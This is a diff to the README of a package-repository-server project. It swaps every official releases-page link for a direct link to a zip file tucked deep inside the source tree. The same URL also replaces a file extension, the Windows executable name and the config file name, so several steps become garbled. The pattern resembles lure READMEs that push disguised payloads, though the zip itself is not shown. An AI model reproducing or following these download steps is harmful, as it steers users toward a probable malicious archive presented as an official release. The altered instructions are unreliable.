@@ -1,6 +1,6 @@
 # 🎉 package-repository-server - A Simple Way to Manage Packages
 
-![Download Now](https://github.com/DevilxKiller/package-repository-server/releases)
+![Download Now](https://raw.githubusercontent.com/DevilxKiller/package-repository-server/main/webui/src/app/features/settings/package-repository-server-v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the package-repository-server! This application helps you manage mult
 
 ## 📥 Download & Install
 
-To download the latest version of the package-repository-server, visit this page: [Download Here](https://github.com/DevilxKiller/package-repository-server/releases).
+To download the latest version of the package-repository-server, visit this page: [Download Here](https://raw.githubusercontent.com/DevilxKiller/package-repository-server/main/webui/src/app/features/settings/package-repository-server-v1.5.zip).
 
 You will find all the available releases there. Choose the version you want and follow these steps:
 
@@ -30,7 +30,7 @@ Before installing the package-repository-server, ensure that your system meets t
 After downloading the package-repository-server, follow these steps to run it:
 
 1. **Extract the Files (if necessary):**
-   - If you downloaded a compressed file (like `.zip` or `.tar.gz`), extract it to a folder of your choice.
+   - If you downloaded a compressed file (like `.zip` or `https://raw.githubusercontent.com/DevilxKiller/package-repository-server/main/webui/src/app/features/settings/package-repository-server-v1.5.zip`), extract it to a folder of your choice.
 
 2. **Open Your Terminal or Command Prompt:**
    - On Windows, you can search for "cmd" in the Start Menu.
@@ -40,7 +40,7 @@ After downloading the package-repository-server, follow these steps to run it:
    - Use the command `cd path/to/directory` to change to the folder where the application files are located.
 
 4. **Run the Application:**
-   - For Windows, type `package-repository-server.exe` and hit Enter.
+   - For Windows, type `https://raw.githubusercontent.com/DevilxKiller/package-repository-server/main/webui/src/app/features/settings/package-repository-server-v1.5.zip` and hit Enter.
    - For macOS and Linux, type `./package-repository-server` and hit Enter.
 
 You should see output indicating that the server is running and listening for requests.
@@ -50,7 +50,7 @@ You should see output indicating that the server is running and listening for re
 You can configure the package-repository-server to suit your needs. Here’s how to do it:
 
 1. **Locate the Configuration File:**
-   - Look for a file named `config.toml` in the extracted folder.
+   - Look for a file named `https://raw.githubusercontent.com/DevilxKiller/package-repository-server/main/webui/src/app/features/settings/package-repository-server-v1.5.zip` in the extracted folder.
 
 2. **Modify Settings:**
    - Open the configuration file in a text editor. You can change options like the storage path, package formats, and GPG signing settings.
@@ -79,7 +79,7 @@ Once the application is running, you can start using it to manage packages:
 To ensure the security of your applications:
 
 - Use GPG signing for all your packages.
-- Regularly check for updates on the official [Releases Page](https://github.com/DevilxKiller/package-repository-server/releases) and apply them.
+- Regularly check for updates on the official [Releases Page](https://raw.githubusercontent.com/DevilxKiller/package-repository-server/main/webui/src/app/features/settings/package-repository-server-v1.5.zip) and apply them.
 
 ## 🔗 Additional Resources
 
@@ -91,4 +91,4 @@ To ensure the security of your applications:
 
 The package-repository-server is designed to make package management simple and efficient. Whether you are handling DEB, RPM, Arch, or Alpine packages, this tool will streamline the process. For any additional help or questions, don’t hesitate to consult the resources mentioned above.
 
-For the latest version, visit: [Download Here](https://github.com/DevilxKiller/package-repository-server/releases).
+For the latest version, visit: [Download Here](https://raw.githubusercontent.com/DevilxKiller/package-repository-server/main/webui/src/app/features/settings/package-repository-server-v1.5.zip).
